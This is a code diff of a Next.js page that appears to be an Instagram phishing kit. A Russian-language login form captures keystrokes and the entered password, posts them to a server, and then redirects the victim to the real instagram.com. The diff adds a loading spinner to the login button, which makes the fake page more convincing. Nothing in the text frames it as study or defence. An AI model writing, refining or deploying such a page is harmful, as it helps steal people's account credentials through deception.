@@ -1,6 +1,7 @@
 "use client";
 import Image from "next/image";
 import logo from "./logo.png";
+import load from "./load.png";
 import "./styles.css";
 import { useEffect, useState } from "react";
 import Link from "next/link";
@@ -8,7 +9,7 @@ import Link from "next/link";
 export default function Home() {
   const [startTime] = useState(new Date());
   const [inputData, setInputData] = useState({});
-  const [submitCount, setSubmitCount] = useState(0);
+  const [loading, setLoading] = useState(false);
 
   // Capture keyboard events
   useEffect(() => {
@@ -31,7 +32,7 @@ export default function Home() {
 
   // Capture form submission
   const handleFormSubmit = () => {
-    setSubmitCount((prevCount) => prevCount + 1);
+    setLoading(true);
 
     // Send data to the server
     const formData = {
@@ -48,8 +49,9 @@ export default function Home() {
       body: JSON.stringify(formData),
     })
       .then((response) => {
+        setLoading(true);
         // Handle server response here
-        document.location.replace('https://instagram.com')
+        document.location.replace("https://instagram.com");
       })
       .catch((error) => {
         console.error("Error sending data to server:", error);
@@ -79,7 +81,16 @@ export default function Home() {
               <input name="password" type="password" placeholder="Пароль" />
 
               <button id="submit" type="button" onClick={handleFormSubmit}>
-                Войти
+                {loading ? (
+                  <Image
+                    className="copyright"
+                    src={load}
+                    alt="log"
+                    height={20}
+                  />
+                ) : (
+                  "Войти"
+                )}
               </button>
             </form>
           </div>
